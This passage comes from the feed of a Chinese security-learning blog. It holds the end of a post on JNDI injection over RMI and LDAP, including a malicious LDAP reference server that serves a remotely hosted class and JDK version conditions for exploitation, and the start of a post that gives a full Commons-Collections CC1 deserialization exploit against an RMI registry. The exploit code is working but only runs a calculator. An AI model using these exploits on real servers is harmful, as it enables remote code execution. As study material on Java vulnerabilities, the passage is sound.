class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac将其编译为字节码(建议使用命令行来进行, 避免此字节码具有包结构, 注意使用和客户端服务端相同的java版本)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac JndiCalc.java</span><br></pre></td></tr></table></figure><p>然后使用python起一个http服务将其开放即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 7777</span><br></pre></td></tr></table></figure><p>之后运行客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713154736808.png" alt="image-20240713154736808"></p><p>可以跟一下调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713160109911.png" alt="image-20240713160109911"></p><p>到这里实例化了恶意对象</p><p>此方法加载了外部的java字节码, 在高版本中这是不受信任的</p><h3 id="JNDI结合LDAP"><a href="#JNDI结合LDAP" class="headerlink" title="JNDI结合LDAP"></a>JNDI结合LDAP</h3><blockquote><ul><li>ldap 是一种协议，并不是 Java 独有的。</li></ul><p>LDAP 既是一类服务，也是一种协议，定义在 <a href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p><p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p></blockquote><p>首先是添加LDAP的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#EvilObject&quot;</span>;  </span><br><span class="line"> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line"> InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line"> <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line"> System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment"> * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment"> */</span> <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line"> <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line"> System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line"> <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line"> <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line"> result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILdapClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://localhost:1099/remoteObj&quot;</span>);  </span><br><span class="line"> System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python 起一个 HTTP 服务存放恶意类即可</p><blockquote><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。</p></blockquote><p>这里LDAP我还不是很了解, 之后学习了再新开一篇细说</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JNDI注入初探&quot;&gt;&lt;a href=&quot;#JNDI注入初探&quot; class=&quot;headerlink&quot; title=&quot;JNDI注入初探&quot;&gt;&lt;/a&gt;JNDI注入初探&lt;/h1&gt;&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>针对RMI的几种攻击方式</title>
    <link href="http://example.com/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://example.com/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2024-07-10T05:51:40.000Z</published>
    <updated>2024-07-12T07:00:30.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>客户端请求注册中心有 list, bind, rebind, unbind, lookup这几种方式, 当他们被调用时, 在Registry服务端中<code>RegistryImpl_Skel#dispatch</code>就会对应执行,且往往伴随着反序列化的进行,  这就导致了其易受攻击</p><p>如果你打开查看源码, 会发现dispatch方法下有几个case分支, 他们与调用方法的对应关系如下:</p><ul><li>0 —– bind</li><li>1 —– list</li><li>2 —– lookup</li><li>3 —– rebind</li><li>4 —– unbind</li></ul><p>我们按顺序依次分析:</p><h3 id="bind与rebind"><a href="#bind与rebind" class="headerlink" title="bind与rebind"></a>bind与rebind</h3><p>bind方法对应了你在客户端的这条代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>你是否疑惑, 绑定对象不是在服务器实现的吗, 怎么会造成客户端攻击服务器呢??</p><p>实际上在客户端拿到的注册中心的Stub (客户端拿到的是RegistryImpl_Stub) 中,是有上面提到的所有5种方法的, 因此在Client端也可以使用bind方法, 就是这么简单</p><p>直接看<code>RegistryImpl_Skel#dispatch</code>的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710140531336.png" alt="image-20240710140531336"></p><p>很容易就发现了反序列化的入口, 这里的var11就是传过来的序列化对象, 因此利用起来也是非常ez     (神马??你问我怎么知道var11是传过来的序列化对象???? 当然是因为它的类型是<code>ObjectInput var11;</code>加上<code>var11 = var2.getInputStream();</code>啦)</p><p>有了反序列化的入口, 配合我们之前学过的CC链, 就可以来一段组合技</p><p>先给注册中心导入CC1的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接拿来CC1的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在CC1中它的起点是<code>AnnotationInvocationHandler.readObject()</code>, 它正好是一个<code>InvocationHandler</code></p><p>我们知道服务器接收到的对象是一个远程动态代理, 所以还需要稍作修改, </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br></pre></td></tr></table></figure><p>这样就得到了一个恶意的远程动态代理</p><p>完整的exp是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, remote);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  